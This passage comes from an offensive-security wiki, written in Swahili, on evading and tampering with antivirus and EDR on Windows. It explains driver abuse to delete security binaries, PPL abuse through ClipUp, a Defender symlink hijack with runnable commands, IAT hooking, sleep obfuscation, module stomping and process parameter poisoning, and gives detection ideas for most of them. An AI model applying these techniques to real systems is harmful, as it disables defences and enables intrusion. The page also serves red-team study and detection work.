`Start=0` haiwezi kutumika kwa sababu BTR hufanya file I/O kutoka `DriverEntry` kabla ya storage stack na link ya `SystemRoot` kuwa tayari. `Start=1` pamoja na kundi la kipaumbele cha juu la `Boot Bus Extender` badala yake hutekelezwa katika Phase 1: NTFS inaweza kutumika, lakini security drivers nyingi zinazoanza na mfumo pamoja na huduma za EDR za user-mode bado hazijaanza. Boot-start filters kama `WdFilter` huenda tayari zimepakiwa, lakini BTR inaweza kuondoa binaries zao au usanidi wa service kabla ya start inayofuata, na inaweza kufuta service executables kabla ya SCM kuanzisha huduma hizo. ELAM haifungi pengo hili kwa sababu BTR huendeshwa baada ya boot-start evaluation na ina Microsoft signature halali.<sup>[[36]](#references)</sup>

Vitendo vingi hutekelezwa katika transaction moja. PoC huweka Action 1 mwanzoni kwa `\SystemRoot\Temp\BootClean.log` iliyowekwa moja kwa moja: BTR huunda logi hii, kisha hutumia ombi lake yenyewe la kuifuta na kuiondoa kabla ya kujiondoa. Hii hupunguza ushahidi, huku kuweka feedback katika `<random>.sys:<random>.dat` kukiruhusu driver na streams zote mbili kuondolewa pamoja.<sup>[[36]](#references)[[37]](#references)</sup>

### Uwiano wa ugunduzi wenye ishara kubwa

Sheria zinazotegemea signature pekee na Microsoft vulnerable-driver blocklist hazishughulikii matumizi mabaya ya utendaji uliokusudiwa wa BTR. Pendelea uwiano huu wa kitabia, huku ukitofautisha Defender lineage halali na launcher isiyo ya kawaida.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Uundaji wa `.sys:changelist` ni wa lazima katika BTR staging. `.dat` ADS iliyounganishwa na `.sys` hiyo hiyo inatia shaka zaidi, kwa sababu Defender halali kwa kawaida huweka feedback chini ya `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 bila System 7045:** linganisha uundaji wa moja kwa moja wa `HKLM\SYSTEM\CurrentControlSet\Services\<random>` wenye `Args=...:changelist` na `Group=Boot Bus Extender`, bila tukio linalolingana la SCM installation.
- **Sysmon 6 -> 23:** linganisha upakiaji wa BTR driver unaojulikana kutoka kwenye lineage isiyo ya Defender na ufutaji wa file unaofuata unaohusishwa na `System`/PID 4, hasa kwa security binaries.
- **Sysmon 11 -> 23:** toa alert kuhusu uundaji na ufutaji wa haraka wa `\SystemRoot\Temp\BootClean.log` na `System`/PID 4.
- Zuia na ukague ugawaji/uwezeshaji wa `SeLoadDriverPrivilege`; Microsoft signature pekee haitoshi kuwa trust wakati security-tool driver imewekwa na `cmd.exe`, PowerShell, au process isiyojulikana.

## Kutumia Vibaya Protected Process Light (PPL) Ili Kuingilia AV/EDR Kwa LOLBINs

Protected Process Light (PPL) hutekeleza signer/level hierarchy ili processes zilizolindwa zenye level sawa au ya juu pekee ziweze kuingiliana. Kwa upande wa offensive, ikiwa unaweza kuanzisha kwa uhalali binary yenye PPL na kudhibiti arguments zake, unaweza kubadilisha utendaji salama (k.m., logging) kuwa write primitive iliyowekewa mipaka na PPL dhidi ya protected directories zinazotumiwa na AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Kinachofanya process iendeshe kama PPL
- Target EXE (na DLL yoyote iliyopakiwa) lazima iwe imesainiwa kwa EKU inayoweza kutumia PPL.
- Process lazima iundwe kwa CreateProcess kwa kutumia flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Protection level inayolingana lazima iombwe kulingana na signer wa binary (k.m., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` kwa anti-malware signers, `PROTECTION_LEVEL_WINDOWS` kwa Windows signers). Levels zisizo sahihi zitasababisha creation kushindwa.

Tazama pia utangulizi mpana kuhusu PP/PPL na ulinzi wa LSASS hapa:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (huchagua protection level na kupeleka arguments kwa target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Muundo wa matumizi:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Mfumo binary iliyosainiwa `C:\Windows\System32\ClipUp.exe` hujizindua yenyewe na hukubali parameter ya kuandika log file kwenye path iliyobainishwa na caller.
- Inapozinduliwa kama mchakato wa PPL, uandishi wa file hufanyika kwa backing ya PPL.
- ClipUp haiwezi ku-parse paths zenye spaces; tumia 8.3 short paths kuelekeza kwenye maeneo ambayo kwa kawaida yamelindwa.

8.3 short path helpers
- Orodhesha majina mafupi: `dir /x` katika kila parent directory.
- Pata short path katika cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Zindua LOLBIN yenye uwezo wa PPL (ClipUp) kwa `CREATE_PROTECTED_PROCESS` ukitumia launcher (kwa mfano, CreateProcessAsPPL).
2) Pitisha argument ya ClipUp ya log-path ili kulazimisha uundaji wa file katika protected AV directory (kwa mfano, Defender Platform). Tumia majina mafupi ya 8.3 inapohitajika.
3) Ikiwa target binary kwa kawaida huwa open/locked na AV inapokuwa inaendesha (kwa mfano, MsMpEng.exe), panga uandishi wakati wa boot kabla AV haijaanza kwa kusakinisha auto-start service inayotekelezwa mapema kwa kutegemewa. Thibitisha mpangilio wa boot kwa Process Monitor (boot logging).
4) Baada ya reboot, uandishi unaoungwa mkono na PPL hutokea kabla AV haijafunga binaries zake, na hivyo kuharibu target file na kuzuia startup.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Maelezo na masharti
- Huwezi kudhibiti maudhui ambayo ClipUp huandika isipokuwa mahali yanapowekwa; primitive hii inafaa zaidi kwa kuharibu data kuliko kuingiza maudhui kwa usahihi.
- Inahitaji local admin/SYSTEM ili kusakinisha/kuanzisha service na kuwa na muda wa reboot.
- Muda ni muhimu: target haipaswi kuwa wazi; utekelezaji wakati wa boot huepuka file locks.

Detections
- Uundaji wa process wa `ClipUp.exe` wenye arguments zisizo za kawaida, hasa ikiwa parent ni launchers zisizo za kawaida, karibu na boot.
- Services mpya zilizosanidiwa kujianzisha zikiwa na binaries zinazotiliwa shaka na kuanza mara kwa mara kabla ya Defender/AV. Chunguza uundaji/urekebishaji wa service kabla ya kushindwa kwa Defender kuanza.
- Ufuatiliaji wa uadilifu wa files kwenye Defender binaries/Platform directories; uundaji/urekebishaji usiotarajiwa unaofanywa na processes zenye protected-process flags.
- ETW/EDR telemetry: tafuta processes zilizoundwa kwa `CREATE_PROTECTED_PROCESS` na matumizi yasiyo ya kawaida ya kiwango cha PPL na binaries zisizo za AV.

Mitigations
- WDAC/Code Integrity: punguza ni signed binaries zipi zinaweza kuendeshwa kama PPL na chini ya parents zipi; zuia invocation ya ClipUp nje ya contexts halali.
- Service hygiene: punguza uundaji/urekebishaji wa auto-start services na fuatilia uchezewaji wa mpangilio wa kuanza.
- Hakikisha Defender tamper protection na early-launch protections zimewezeshwa; chunguza startup errors zinazoashiria uharibifu wa binary.
- Fikiria kuzima uundaji wa 8.3 short-name kwenye volumes zinazohifadhi security tooling ikiwa inaoana na mazingira yako (ifanyie majaribio kwa kina).

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender huchagua platform ambayo itaendesha kwa kuorodhesha subfolders zilizo chini ya:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Huchagua subfolder yenye lexicographic version string ya juu zaidi (kwa mfano, `4.18.25070.5-0`), kisha huanzisha Defender service processes kutoka humo (ikisasisha service/registry paths ipasavyo). Uteuzi huu unaamini directory entries, ikiwemo directory reparse points (symlinks). Administrator anaweza kutumia hili kuelekeza Defender kwenye path inayoweza kuandikwa na attacker na kufanikisha DLL sideloading au service disruption.<sup>[[21]](#references)[[22]](#references)</sup>

Masharti ya awali
- Local Administrator (inahitajika kuunda directories/symlinks chini ya Platform folder)
- Uwezo wa kufanya reboot au kuchochea uteuzi upya wa Defender platform (service restart wakati wa boot)
- Built-in tools pekee zinahitajika (mklink)

Kwa nini inafanya kazi
- Defender huzuia uandishi kwenye folders zake yenyewe, lakini uteuzi wake wa platform unaamini directory entries na huchagua version ya juu zaidi kwa mpangilio wa lexicographic bila kuthibitisha kuwa target inaelekeza kwenye path iliyolindwa/kuaminika.

Hatua kwa hatua (mfano)
1) Andaa clone inayoweza kuandikwa ya platform folder ya sasa, kwa mfano `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Unda directory symlink ya version ya juu ndani ya Platform inayoelekeza kwenye folda yako:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Uteuzi wa trigger (reboot inapendekezwa):
```cmd
shutdown /r /t 0
```
4) Thibitisha kuwa MsMpEng.exe (WinDefend) inaendeshwa kutoka kwenye path iliyoelekezwa upya:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Unapaswa kufuatilia path ya process mpya chini ya `C:\TMP\AV\` na service configuration/registry inayoonyesha eneo hilo.

Chaguo za Post-exploitation
- DLL sideloading/code execution: Weka au badilisha DLL ambazo Defender hupakia kutoka application directory yake ili kutekeleza code katika processes za Defender. Tazama sehemu iliyo hapo juu: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Ondoa version-symlink ili wakati wa start inayofuata path iliyosanidiwa isitatue na Defender ishindwe kuanza:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Kumbuka kwamba technique hii haitoi privilege escalation yenyewe; inahitaji admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams zinaweza kuhamisha runtime evasion kutoka kwenye C2 implant hadi ndani ya target module yenyewe kwa ku-hook Import Address Table (IAT) yake na kuelekeza API zilizochaguliwa kupitia attacker-controlled, position‑independent code (PIC). Hii inapanua evasion zaidi ya API surface ndogo inayotolewa na kits nyingi (k.m., CreateProcessA), na kupeleka protections hizo hizo kwa BOFs na post‑exploitation DLLs.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Mbinu ya kiwango cha juu
- Stage PIC blob pamoja na target module kwa kutumia reflective loader (iliyowekwa mwanzoni au companion). PIC lazima iwe self‑contained na position‑independent.
- Host DLL inapopakia, pitia IMAGE_IMPORT_DESCRIPTOR yake na patch IAT entries za targeted imports (k.m., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) ili zielekeze kwenye thin PIC wrappers.
- Kila PIC wrapper hutekeleza evasions kabla ya kufanya tail-call kwenye real API address. Evasions za kawaida zinajumuisha:
- Memory mask/unmask kuzunguka call (k.m., encrypt beacon regions, RWX→RX, kubadilisha page names/permissions), kisha kurejesha hali baada ya call.
- Call-stack spoofing: tengeneza stack isiyo na mashaka na uingie kwenye target API ili call-stack analysis itatue hadi kwenye frames zinazotarajiwa.<sup>[[9]](#references)</sup>
- Kwa compatibility, export interface ili Aggressor script (au equivalent) iweze kusajili API ambazo zitafanyiwa hook kwa Beacon, BOFs na post‑ex DLLs.

Kwa nini utumie IAT hooking hapa
- Hufanya kazi kwa code yoyote inayotumia hooked import, bila kurekebisha tool code au kutegemea Beacon ku-proxy API maalum.
- Hushughulikia post‑ex DLLs: ku-hook LoadLibrary* hukuwezesha kukatiza module loads (k.m., System.Management.Automation.dll, clr.dll) na kutumia masking/stack evasion hiyo hiyo kwenye API calls zao.
- Hurejesha matumizi ya kuaminika ya post‑ex commands zinazozalisha processes dhidi ya detections zinazotegemea call-stack kwa ku-wrap CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- Tumia patch baada ya relocations/ASLR na kabla ya matumizi ya kwanza ya import. Reflective loaders kama TitanLdr/AceLdr zinaonyesha hooking wakati wa DllMain ya module iliyopakiwa.
- Weka wrappers ndogo na salama kwa PIC; resolve API halisi kupitia thamani ya awali ya IAT uliyoihifadhi kabla ya kupatching au kupitia LdrGetProcedureAddress.
- Tumia mabadiliko ya RW → RX kwa PIC na epuka kuacha pages zenye writable+executable.

Call-stack spoofing stub
- PIC stubs za mtindo wa Draugr huunda fake call chain (return addresses zinazoelekea kwenye modules zisizo na madhara) kisha huingia kwenye API halisi.
- Hii hushinda detections zinazotarajia stacks za kawaida kutoka Beacon/BOFs kwenda kwenye APIs nyeti.
- Ziunganishe na mbinu za stack cutting/stack stitching ili kuingia ndani ya frames zinazotarajiwa kabla ya API prologue.

Operational integration
- Weka reflective loader mwanzoni mwa post-ex DLLs ili PIC na hooks zianze moja kwa moja DLL inapopakiwa.
- Tumia Aggressor script kusajili target APIs ili Beacon na BOFs zinufaike kwa uwazi na njia hiyo hiyo ya evasion bila mabadiliko ya code.

Detection/DFIR considerations
- IAT integrity: entries zinazoresolve kwenda kwenye anwani zisizo za image (heap/anon); verification ya mara kwa mara ya import pointers.
- Stack anomalies: return addresses zisizohusiana na images zilizopakiwa; transitions za ghafla kwenda kwenye non-image PIC; RtlUserThreadStart ancestry isiyolingana.
- Loader telemetry: writes za ndani ya process kwenda kwenye IAT, shughuli za mapema za DllMain zinazobadilisha import thunks, RX regions zisizotarajiwa zinazoundwa wakati wa load.
- Image-load evasion: ikiwa unahook LoadLibrary*, monitor loads zinazotia shaka za automation/clr assemblies zinazohusiana na matukio ya memory masking.

Related building blocks and examples
- Reflective loaders zinazofanya IAT patching wakati wa load (mfano, TitanLdr, AceLdr)
- Memory masking hooks (mfano, simplehook) na stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (mfano, Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

Ikiwa unadhibiti reflective loader, unaweza kuhook imports **wakati wa `ProcessImports()`** kwa kubadilisha pointer ya `GetProcAddress` ya loader na custom resolver inayokagua hooks kwanza:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Unda **resident PICO** (persistent PIC object) inayobaki baada ya transient loader PIC kujifree.
- Export function ya `setup_hooks()` inayobadilisha import resolver ya loader (mfano, `funcs.GetProcAddress = _GetProcAddress`).
- Ndani ya `_GetProcAddress`, ruka ordinal imports na utumie hash-based hook lookup kama `__resolve_hook(ror13hash(name))`. Ikiwa hook ipo, irudishe; vinginevyo delegate kwenda kwenye `GetProcAddress` halisi.
- Sajili hook targets wakati wa link time kwa Crystal Palace `addhook "MODULE$Func" "hook"` entries. Hook hubaki valid kwa sababu iko ndani ya resident PICO.

Hii hutoa **import-time IAT redirection** bila kupatching code section ya DLL iliyopakiwa baada ya load.

### Forcing hookable imports when the target uses PEB-walking

Import-time hooks hufanya kazi tu ikiwa function ipo kweli kwenye IAT ya target. Ikiwa module inaresolve APIs kupitia PEB-walk + hash (bila import entry), lazimisha import halisi ili loader's `ProcessImports()` path iione:

- Badilisha hashed export resolution (mfano, `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) na direct reference kama `&WaitForSingleObject`.
- Compiler huunda IAT entry, hivyo kuwezesha interception wakati reflective loader inaresolve imports.

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

Badala ya kupatching `Sleep`, hook **actual wait/IPC primitives** zinazotumiwa na implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Kwa waits ndefu, wrap call ndani ya obfuscation chain ya mtindo wa Ekko inayosimba kwa encryption image iliyo memory wakati wa idle:<sup>[[31]](#references)[[27]](#references)</sup>

- Tumia `CreateTimerQueueTimer` kupanga mfululizo wa callbacks zinazoita `NtContinue` zikiwa na crafted `CONTEXT` frames.
- Chain ya kawaida (x64): weka image kuwa `PAGE_READWRITE` → RC4 encrypt kupitia `advapi32!SystemFunction032` juu ya mapped image yote → fanya blocking wait → RC4 decrypt → **rejesha per-section permissions** kwa kutembea kwenye PE sections → signal completion.
- `RtlCaptureContext` hutoa template `CONTEXT`; clone ndani ya frames nyingi na weka registers (`Rip/Rcx/Rdx/R8/R9`) ili kuita kila step.

Operational detail: rudisha “success” kwa waits ndefu (mfano, `WAIT_OBJECT_0`) ili caller iendelee wakati image ikiwa masked. Pattern hii huficha module kutoka kwa scanners wakati wa idle windows na huepuka classic “patched `Sleep()`” signature.

Detection ideas (telemetry-based)
- Bursts za `CreateTimerQueueTimer` callbacks zinazoelekea `NtContinue`.
- `advapi32!SystemFunction032` ikitumika kwenye large contiguous image-sized buffers.
- `VirtualProtect` ya range kubwa ikifuatwa na custom per-section permission restoration.

### Runtime CFG registration for sleep-obfuscation gadgets

Kwenye targets zilizo CFG-enabled, indirect jump ya kwanza kwenda kwenye mid-function gadget kama `jmp [rbx]` au `jmp rdi` kwa kawaida ita-crash process kwa `STATUS_STACK_BUFFER_OVERRUN` kwa sababu gadget haipo kwenye CFG metadata ya module. Ili kuweka chains za mtindo wa Ekko/Kraken zikifanya kazi ndani ya hardened processes:<sup>[[30]](#references)</sup>

- Sajili kila indirect destination inayotumiwa na chain kupitia `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` na `CFG_CALL_TARGET_VALID` entries.
- Kwa anwani zilizo ndani ya loaded images (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` lazima ianze kwenye **image base** na ifunike **full image size**.
- Kwa manually mapped/PIC/stomped regions, tumia **allocation base** na allocation size badala yake.
- Weka alama si kwa dispatch gadget pekee, bali pia kwa exports zinazofikiwa indirectly (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls) na executable sections zozote zinazodhibitiwa na attacker ambazo zitakuwa indirect targets.

Hii hubadilisha sleep chains za ROP/JOP-style kutoka “hufanya kazi tu kwenye non-CFG processes” kuwa primitive inayoweza kutumika tena kwa `explorer.exe`, browsers, `svchost.exe`, na endpoints nyingine zilizocompile na `/guard:cf`.

### CET-safe stack spoofing for sleeping threads

Full `CONTEXT` replacement inaonekana wazi na inaweza kuvuruga mifumo ya CET Shadow Stack kwa sababu spoofed `Rip` lazima bado ikubaliane na hardware shadow stack. Sleep-masking pattern salama zaidi ni:<sup>[[30]](#references)</sup>

- Chagua thread nyingine ndani ya process hiyo hiyo na usome `NT_TIB` / TEB stack bounds zake (`StackBase`, `StackLimit`) kupitia `NtQueryInformationThread`.
- Hifadhi nakala ya TEB/TIB halisi ya current thread.
- Capture sleeping context halisi kwa `GetThreadContext`.
- Nakili **real `Rip` pekee** ndani ya spoof context, ukiacha spoofed `Rsp`/stack state ikiwa hivyo.
- Wakati wa sleep window, nakili `NT_TIB` ya spoof thread ndani ya current TEB ili stack walkers zi-unwind ndani ya legitimate stack range.
- Baada ya wait kuisha, rejesha TIB ya awali na thread context.

Hii huhifadhi instruction pointer inayolingana na CET huku ikiwasababisha EDR stack walkers wanaoamini TEB stack metadata kuthibitisha unwinds kupata taarifa potofu.

### APC-based alternative: Kraken Mask

Ikiwa timer-queue dispatch ina signature inayotambulika sana, sleep-encrypt-spoof-restore sequence hiyo hiyo inaweza kutekelezwa kutoka suspended helper thread kwa kutumia queued APCs:<sup>[[27]](#references)</sup>

- Unda helper thread yenye `NtTestAlert` kama entrypoint.
- Queue prepared `CONTEXT` frames/APCs kwa `NtQueueApcThread` na zitoe kwa `NtAlertResumeThread`.
- Hifadhi chain state kwenye heap badala ya helper stack ili kuepuka kumaliza default 64 KB thread stack.
- Tumia `NtSignalAndWaitForSingleObject` kusignal start event atomically na kublock.
- Suspend main thread kabla ya kurejesha TIB/context (`NtSuspendThread` → restore → `NtResumeThread`) ili kupunguza race window ambayo scanner inaweza kunasa stack ikiwa imerejeshwa nusu.

Hii hubadilisha `CreateTimerQueueTimer` + `NtContinue` signature na kuwa helper-thread/APC signature huku ikiweka malengo yale yale ya RC4 masking na stack-spoofing.

Additional detection ideas
- `NtSetInformationVirtualMemory` yenye `VmCfgCallTargetInformation` muda mfupi kabla ya sleeps, waits, au APC dispatch.
- `GetThreadContext`/`SetThreadContext` iliyozungukwa na `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject`, au `ConnectNamedPipe`.
- `NtQueryInformationThread` ikifuatwa na writes za moja kwa moja ndani ya TEB/TIB stack bounds za current thread.
- `NtQueueApcThread`/`NtAlertResumeThread` chains zinazofikia indirectly `SystemFunction032`, `VirtualProtect`, au helpers za section-permission restoration.
- Matumizi yanayojirudia ya short gadget signatures kama `FF 23` (`jmp [rbx]`) au `FF E7` (`jmp rdi`) kama dispatch pivots ndani ya signed modules.


## Precision Module Stomping

Module stomping hutekeleza payloads kutoka kwenye **`.text` section ya DLL iliyokwisha mapped ndani ya target process** badala ya kutenga private executable memory inayoonekana wazi au kupakia fresh sacrificial DLL. Overwrite target inapaswa kuwa **loaded, disk-backed image** ambayo code space yake inaweza kubeba payload bila kuharibu code paths ambazo process bado inahitaji.<sup>[[1]](#references)[[2]](#references)</sup>

### Reliable target selection

Naive stomping dhidi ya modules za kawaida kama `uxtheme.dll` au `comctl32.dll` haina reliability: DLL inaweza isiwe loaded kwenye remote process, na code region ikiwa ndogo sana ita-crash process. Workflow inayotegemeka zaidi ni:

1. Enumerate modules za target process na uhifadhi **names-only include list** ya DLLs zilizokwisha loaded.
2. Build payload kwanza na urekodi **exact byte size** yake.
3. Scan candidate DLLs kwenye disk na linganisha PE section **`.text` `Misc_VirtualSize`** na payload size. Hili ni muhimu zaidi kuliko file size kwa sababu linaonyesha ukubwa wa executable section **wakati ime-mapped kwenye memory**.
4. Parse **Export Address Table (EAT)** na chagua exported function RVA kama stomp start offset.
5. Kadiria **blast radius**: ikiwa payload ni kubwa kuliko selected function boundary, ita-overwrite adjacent exports zilizopangwa baada yake kwenye memory.

Typical recon/selection helpers seen in the wild:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Vidokezo vya uendeshaji
- Pendelea DLLs **ambazo tayari zimepakiwa** katika remote process ili kuepuka telemetry ya `LoadLibrary`/image loads zisizotarajiwa.
- Pendelea exports ambazo target application huzitekeleza mara chache; vinginevyo normal code paths zinaweza kufikia stomped bytes kabla au baada ya thread creation.
- Implants kubwa mara nyingi huhitaji kubadilisha shellcode embedding kutoka string literal hadi **byte-array/braced initializer** ili buffer nzima iwakilishwe kwa usahihi katika injector source.

Mawazo ya detection
- Remote writes zinazoelekezwa kwenye **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) badala ya private RWX/RX allocations zinazotumika zaidi.
- Export entry points ambazo bytes zake za in-memory hazilingani tena na backing file iliyo kwenye disk.
- Remote threads au context pivots zinazoanza execution ndani ya legitimate DLL export ambayo first bytes zake zilibadilishwa hivi karibuni.
- Sequences za kutia shaka za `VirtualProtect(Ex)` / `WriteProcessMemory` dhidi ya DLL `.text` pages zikifuatiwa na thread creation.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) ni technique ya **process-injection / EDR-evasion** inayokwepa classic remote write path (`VirtualAllocEx` + `WriteProcessMemory`). Badala ya kunakili bytes ndani ya target inayokwisha kuwa running, hutumia ukweli kwamba Windows **hunakili selected `CreateProcessW` startup parameters ndani ya child process** na kuzihifadhi ndani ya `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Poisonable carriers copied by `CreateProcessW`

Carriers zenye manufaa ni:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (pamoja na `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Vikwazo vya carrier vya kuzingatia:

- `lpCommandLine` lazima ielekeze kwenye **writable memory** kwa ajili ya `CreateProcessW`, na ina kikomo cha **Unicode characters 32,767** ikijumuisha null terminator.
- `lpEnvironment` lazima iwe Unicode environment block yenye strings zinazofuatana za `NAME=VALUE\0`, zikimalizika kwa `\0` ya ziada.
- `lpReserved` imehifadhiwa rasmi, hivyo mapping ya `ShellInfo` inapaswa kuchukuliwa kama implementation detail badala ya documented contract thabiti.

Hii hubadilisha normal process creation kuwa **payload-transfer primitive**. Operator huunda child process kwa startup data inayodhibitiwa na attacker na kuruhusu Windows ifanye cross-process copy.

### Remote lookup flow without remote write APIs

Baada ya child kuundwa, resolve copied buffer kwa kutumia **read-only** primitives:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → pata `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Soma remote `PEB`
3. Fuata `PEB.ProcessParameters`
4. Soma `RTL_USER_PROCESS_PARAMETERS`
5. Tumia pointer iliyochaguliwa:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Minimal flow:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### Kutekeleza parameter buffer iliyonakiliwa

Eneo la parameter lililonakiliwa kwa kawaida huwa `RW`, si la kutekelezeka. P3 chain ya kawaida ni:

1. Unda process kwa kawaida (bila kuiunda ikiwa suspended)
2. Fanya ukurasa wa parameter uliochaguliwa uwe executable kwa kutumia `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Tumia tena main thread handle iliyorejeshwa katika `PROCESS_INFORMATION`
4. Elekeza upya utekelezaji kwa `NtSetContextThread` (`CONTEXT_CONTROL`, overwrite `RIP`)

Tofauti na workflows za kawaida za thread hijacking, hii **haihitaji** `SuspendThread` / `ResumeThread`; context inaweza kubadilishwa moja kwa moja kwenye returned main thread handle.

Hii huepuka APIs kadhaa zinazofuatiliwa kwa kawaida kwa injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- mara nyingi pia `SuspendThread` / `ResumeThread`

### Kizuizi cha null-byte na staged shellcode

Carriers zote tatu ni **data ya string au inayofanana na string**, hivyo raw payload iliyo na `0x00` hukatwa wakati wa transfer. Workaround ya vitendo ni **null-free first stage** inayounda upya constants wakati wa runtime, kisha kupakia second stage ya aina yoyote.

Pattern rahisi ni uundaji wa constants unaotegemea XOR:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
Hii huruhusu first stage kutengeneza stack strings, API arguments, DLL paths, au second-stage shellcode loader bila kuingiza null bytes kwenye parameter inayosafirishwa.

### Stack-based API calls kutoka first stage

Wakati first stage lazima iite APIs kama `LoadLibraryA`, inaweza:

- kusukuma string/buffer kwenye stack ya target
- kutenga **32-byte x64 shadow space**
- kuweka `RCX`, `RDX`, `R8`, `R9` kuwa constants au pointers zinazohusiana na `RSP`
- kuhakikisha `RSP` iko **16-byte aligned** kabla ya call

Second stage inaweza kisha kunakiliwa kutoka stack hadi kwenye allocation ya `PAGE_READWRITE`, kubadilishwa kuwa `PAGE_EXECUTE_READ` kwa `VirtualProtect`, na kuhamishiwa execution, hivyo kuepuka allocation ya moja kwa moja ya RWX.

### Detection ideas

Fursa nzuri za hunting zilizotajwa na waandishi:

- `VirtualProtectEx` / `NtProtectVirtualMemory` kufanya **process-parameter pages ziwe executable**
- protection change hiyo ikifuatiwa na `SetThreadContext` / `NtSetContextThread`
- remote reads za `PEB` na kisha `RTL_USER_PROCESS_PARAMETERS`
- thamani za `lpCommandLine`, `lpEnvironment`, au `STARTUPINFO.lpReserved` zilizo ndefu isivyo kawaida / zenye entropy kubwa wakati wa process creation

### Notes

- P3 ni **cross-process transfer trick**, si full execution primitive yenyewe: parameter iliyonakiliwa bado inahitaji execute-permission change na njia ya execution redirection.
- `RtlCreateProcessReflection` / Dirty Vanity ilizingatiwa na waandishi lakini ikakataliwa kwa sababu internally hufikia primitives zinazotia shaka kama `NtWriteVirtualMemory` na `NtCreateThreadEx`.

## SantaStealer Tradecraft kwa Fileless Evasion na Credential Theft

SantaStealer (pia huitwa BluelineStealer) inaonyesha jinsi modern info-stealers zinavyochanganya AV bypass, anti-analysis na credential access katika workflow moja.<sup>[[24]](#references)</sup>

### Keyboard layout gating & sandbox delay

